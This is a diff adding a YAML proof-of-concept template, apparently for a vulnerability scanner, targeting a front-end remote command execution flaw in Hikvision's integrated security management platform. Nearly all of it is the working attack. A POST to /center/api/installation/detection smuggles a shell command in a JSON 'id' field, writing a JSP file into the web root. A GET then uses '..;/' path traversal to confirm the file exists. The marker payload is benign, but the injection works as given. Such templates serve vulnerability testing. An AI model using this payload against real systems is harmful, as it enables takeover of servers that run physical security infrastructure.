@@ -1,0 +1,53 @@
+app: Hikvision
+query: app:"Hikvision"
+meta:
+  name: 海康威视综合安防管理平台 前台RCE
+  level: 4
+  tags:
+  - remote_code_execution
+  description: 海康威视综合安防管理平台 /center/api/installation/detection 接口处存在远程命令执行漏洞，攻击者利用该漏洞可直接获取服务器权限。
+  homepage: https://www.hikvision.com/
+  author: X prism
+  references: ""
+  solution: 安装补丁
+  create_at: "2024-07-29 11:41:00"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: '/center/api/installation/detection '
+          redirect: true
+          header:
+          - Content-Type: application/json;charset=UTF-8
+          params: '{"type": "environment", "operate": "", "machines": {"id": "$(echo
+            fsdfsadas>/opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/123.jsp)"}'
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: '"code"'
+          type: contains
+      - request:
+          method: GET
+          path: /portal/ui/login/..;/..;/123.jsp
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: fsdfsadas
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
